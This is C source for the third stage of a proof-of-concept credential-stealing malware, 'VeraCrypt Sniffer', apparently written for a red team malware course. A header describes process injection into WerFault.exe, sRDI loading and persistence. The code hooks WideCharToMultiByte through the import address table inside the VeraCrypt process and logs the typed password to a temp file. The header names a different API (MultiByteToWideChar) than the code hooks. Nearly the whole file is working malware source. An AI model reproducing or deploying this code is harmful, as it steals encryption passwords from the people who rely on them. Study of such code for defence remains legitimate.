/*

 Title: VeraCrypt Sniffer
 Author: KrknSec
 Description: This PoC malware was created for the final assignment during the Sektor7 Red Team Operator Malware Intermediate course.
 The purpose of this application is to sniff out VeraCrypt passwords. This is achieved by hooking the MultiByteToWideChar API call that VeraCrypt
 utilizes after a user inputs their password. Additional explanation of components within this malware is below.

 VCLoader: This is Stage 1. This contains the encrypted Stage 2 payload. Using EarlyBird APC injection into WerFault.exe, Stage 2 will be loaded. Stage 2 is a DLL and
 is executed through the sRDI technique.

 VCMigrate: This is Stage 2. This is a DLL that will persist as WerFault.exe and will wait until it sees the VeraCrypt process. Once the VeraCrypt process
 is noticed, it will decrypt and perform a basic injection of Stage 3. Again Stage 3 is a DLL and uses sRDI.

 VCSniff: This is Stage 3. This is the final payload. Once injected into the VeraCrypt process, it will use IAT hooking to hook the MultiByteToWideChar API call
 and create a file in %APPDATA%\Temp\ folder containing the password.

*/

#include <stdio.h>
#include <windows.h>
#include <dbghelp.h>
#include <tchar.h>

#pragma comment(lib, "user32.lib")
#pragma comment (lib, "dbghelp.lib")


//-----------------------------------------------------------
// ORIGINAL API
// Pointer to original WideCharToMultiByte.
//-----------------------------------------------------------
int (WINAPI * pOrigWideCharToMultiByte)(UINT CodePage, DWORD dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar ) = WideCharToMultiByte;


//------------------------------------------------------------
// HOOK
// Hooked version of WideCharToMultiByte.
//------------------------------------------------------------
int HookedWideCharToMultiByte(UINT CodePage, DWORD dwFlags, _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar) {
	

	// Setup Vars
	int ret;
	char buffer[50];
	HANDLE hFile = NULL;
	DWORD numBytes;
	DWORD retVal = 0;
	TCHAR lpTempPathBuffer[MAX_PATH];
	TCHAR szTempFileName[MAX_PATH];

	// Collect data from the hook but continue execution to the original so the program continues proper functionality.
	ret = pOrigWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
	sprintf(buffer, "VeraCrypt Password = %s\n", lpMultiByteStr);


	// Get temp path
	GetTempPathA(MAX_PATH, lpTempPathBuffer);
	GetTempFileNameA(lpTempPathBuffer, TEXT("ZxVc"), 0, szTempFileName);

	// Store password in a file
	hFile = CreateFileA((LPTSTR) szTempFileName, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		OutputDebugStringA("Error with log file!\n");
	else
		WriteFile(hFile, buffer, strlen(buffer), &numBytes, NULL);
	
	CloseHandle(hFile);
	return ret;
}


//-------------------------------------------------------------
// SET HOOK
// Set hook on origFunc()
//-------------------------------------------------------------
BOOL Hookem(char * dll, char * origFunc, PROC hookingFunc) {


	// IAT Hooking things
    ULONG size;
	DWORD i;
	BOOL found = FALSE;

	// get a HANDLE to a main module == BaseImage
	HANDLE baseAddress = GetModuleHandle(NULL);			
	
	// get Import Table of main module
	PIMAGE_IMPORT_DESCRIPTOR importTbl = (PIMAGE_IMPORT_DESCRIPTOR) ImageDirectoryEntryToDataEx(
												baseAddress,
												TRUE,
												IMAGE_DIRECTORY_ENTRY_IMPORT,
												&size,
												NULL);

	// find imports for target dll 
	for (i = 0; i < size ; i++){
		char * importName = (char *)((PBYTE) baseAddress + importTbl[i].Name);
		if (_stricmp(importName, dll) == 0) {
				found = TRUE;
				break;
		}
	}
	if (!found)
		return FALSE;

	// Optimization: get original address of function to hook 
	// and use it as a reference when searching through IAT directly
	PROC origFuncAddr = (PROC) GetProcAddress(GetModuleHandle(dll), origFunc);

	// Search IAT
	PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA) ((PBYTE) baseAddress + importTbl[i].FirstThunk);
	while (thunk->u1.Function) {
		PROC * currentFuncAddr = (PROC *) &thunk->u1.Function;
		
		// found function address
		if (*currentFuncAddr == origFuncAddr) {

			// make sure memory is writable
			DWORD oldProtect = 0;
			VirtualProtect((LPVOID) currentFuncAddr, 4096, PAGE_READWRITE, &oldProtect);

			// set the hook
			*currentFuncAddr = (PROC)hookingFunc;

			// revert protection setting back
			VirtualProtect((LPVOID) currentFuncAddr, 4096, oldProtect, &oldProtect);

			// remove before release [debugging only]
			OutputDebugStringA("IAT WideCharToMultiByte() function hooked!\n");

			return TRUE;
		}
	thunk++;
	}
	
	return FALSE;
}


//--------------------------------------------------------------------------
// DLL MAIN
// Standard DllMain func and run Hookem() func on DLL Attach
//--------------------------------------------------------------------------
extern "C" _declspec (dllexport) BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			Hookem("kernel32.dll", "WideCharToMultiByte", (PROC) HookedWideCharToMultiByte);
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			break;
	}
	
    return TRUE;
}
//------------------------------------------------------------------------------

